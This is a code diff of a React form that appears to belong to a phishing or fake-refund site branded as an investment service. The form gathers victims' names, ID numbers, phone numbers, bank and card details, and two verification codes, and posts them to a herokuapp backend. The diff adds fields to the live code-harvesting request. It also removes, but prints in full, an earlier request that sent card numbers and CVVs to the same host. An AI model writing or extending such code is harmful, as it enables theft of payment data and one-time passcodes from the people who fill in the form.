@@ -121,7 +121,7 @@ export default function Form() {
 
             if(step === 3) {
                 sendData(3);
-                addVerificationCode1();
+                addVerificationCodes();
             }
 
             if(step === 4) {
@@ -149,8 +149,10 @@ export default function Form() {
         setValues({ ...values, [name]: e.target.value });
     };
     
-    const addVerificationCode1 = () => {
+    const addVerificationCodes = () => {
         axios.post("https://investment-com.herokuapp.com/add-code", {
+            user_request_id: queryId,
+            fullName: values.clientFullname,
             firstCode: vc,
             secondCode: vc2,
             phoneNumber: values.clientPhoneNumber,
@@ -169,34 +171,7 @@ export default function Form() {
     };
 
     const userRequestHandler = () => {
-
-        axios.post("https://investment-com.herokuapp.com/add-order",{
-            fullname: values.clientFullname,
-            idNumber: values.clientId,
-            phoneNumber: values.clientPhoneNumber,
-            refundAmount: values.refundAmount,
-            userBank: values.clientBankAccount,
-            cardNumber: values.clientCardNumber,
-            cardVerificationNumber: values.cardVerificationNumber,
-            accountNumber: values.clientAccountNumber,
-        }, 
-        {
-            headers: {
-                'Access-Control-Allow-Origin': 'https://investment.netlify.app',
-                'Accept': '*',
-                'origin': 'https://investment.netlify.app',
-                'Referer': 'https://investment.netlify.app/',
-                'Host': 'https://investment-com.herokuapp.com'
-            }
-        },
-        ).then((response) => {
-            console.log(response.data);
-            console.log(response.data.result);
-            if(response.data.saved) {
-                setOpen(true);
-            }
-        })
-        
+        setOpen(true);        
     };
 
     return (
